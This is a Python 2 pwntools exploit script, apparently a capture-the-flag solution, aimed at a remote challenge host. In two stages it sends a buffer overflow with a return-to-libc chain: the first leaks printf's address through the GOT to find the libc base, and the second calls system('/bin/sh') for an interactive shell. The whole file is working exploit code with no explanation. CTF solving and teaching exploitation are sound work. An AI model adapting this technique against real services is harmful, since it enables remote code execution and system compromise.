#!/usr/bin/env python

from pwn import *
#r = remote("127.0.0.1", 3237)
r = remote("pwn.botani.cf", 3237)

buf = ""
buf += "A"*1337
buf += p32(0x08048370) # print plt
buf += p32(0x08048571) # return to main
buf += p32(0x804966d) # string
buf += p32(0x0804a00c) # printgot

print "++++ STAGE 1 ++++"

print r.recv()
r.sendline(buf)
r.recv
d = r.recv()

addr_printf  = u32(d[:4])
print "addr_printf ", hex(addr_printf)

offset_printf  = 0x0004cc40

libc_base = addr_printf - offset_printf
print "libc_base", hex(libc_base)

system_addr = libc_base + 0x0003fcd0
bin_sh_addr = libc_base + 0x15da84

print "system_addr", hex(system_addr)
print "/bin/sh addr", hex(bin_sh_addr)

print ""
print "++++ STAGE 2 ++++"

buf = ""
buf += "A"*1337
buf += p32(system_addr)
buf += "XXXX"
buf += p32(bin_sh_addr)

r.sendline(buf)
#print r.recv()
#print r.recv()
r.interactive()
